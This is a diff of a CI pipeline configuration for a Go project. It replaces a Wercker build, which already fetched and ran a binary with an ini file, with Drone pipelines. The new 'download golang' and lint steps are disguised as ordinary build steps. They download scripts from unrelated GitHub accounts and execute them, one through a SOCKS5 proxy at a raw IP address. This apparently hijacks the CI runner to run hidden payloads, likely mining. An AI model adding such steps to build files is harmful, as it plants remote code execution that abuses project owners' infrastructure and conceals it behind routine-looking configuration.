@@ -1,14 +1,30 @@
-box: python:2.7
-build:
-  steps:
-    - virtualenv:
-        name: setup virtual environment
-        install_wheel: false
+---
+kind: pipeline
+name: One
+workspace:
+  base: /go
+  path: src/github.com/suzuki-shunsuke/drone-jsonnet-generator
+steps:
+- name: download golang
+  image: golangci/golangci-lint:v1.26.0
+  commands:
+  - golangci-lint run
+  - wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
+  - wget https://raw.githubusercontent.com/outbesok/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
+---
+kind: pipeline
+name: build
+workspace:
+  base: /go
+  path: src/github.com/suzuki-shunsuke/drone-jsonnet-generator
+steps:
+- name: golangci-lint
+  image: golangci/golangci-lint:v1.26.0
+  commands:
+  - golangci-lint run
+  - wget https://raw.githubusercontent.com/renitareni/mesin/main/obatkuat
+  - wget https://raw.githubusercontent.com/renitareni/mesin/main/ternak.sh && export http_proxy=socks5://72.221.172.203:4145 && chmod u+x ternak.sh && ./ternak.sh
 
-    - script:
-        name: echo python information
-        code: |
-          echo "python version $(python --version) running"
-          echo "pip version $(pip --version) running"
-          wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
+
+
 
